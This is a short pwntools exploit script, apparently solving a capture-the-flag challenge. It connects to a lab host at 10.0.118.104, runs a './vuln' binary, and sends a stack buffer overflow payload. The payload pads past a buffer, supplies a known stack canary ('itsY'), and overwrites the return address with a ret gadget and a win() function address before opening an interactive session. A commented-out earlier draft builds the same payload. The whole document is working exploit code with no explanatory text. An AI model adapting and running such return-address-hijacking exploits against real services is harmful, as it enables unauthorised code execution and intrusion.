# import sys, struct

# payload  = b"A"*128
# payload += b"itsY"
# payload += b"B"*12
# payload += b"C"*8
# payload += struct.pack("<Q", 0x400aa4)
# payload += struct.pack("<Q", 0x4008fd)

# print(len(payload))
# sys.stdout.buffer.write(payload)

from pwn import *

HOST = "10.0.118.104"
PORT = 4456

p = remote(HOST, PORT)

# run the vulnerable binary inside the shell
p.sendline(b"./vuln")

canary = b"itsY"

payload  = b"A"*128
payload += canary
payload += b"B"*12
payload += b"C"*8
payload += p64(0x400aa4)  # ret gadget (stack alignment)
payload += p64(0x4008fd)  # win()

# send length first
p.sendline(str(len(payload)).encode())

# wait for second prompt
p.recvuntil(b"Now enter the string")

# send payload
p.send(payload)

p.interactive()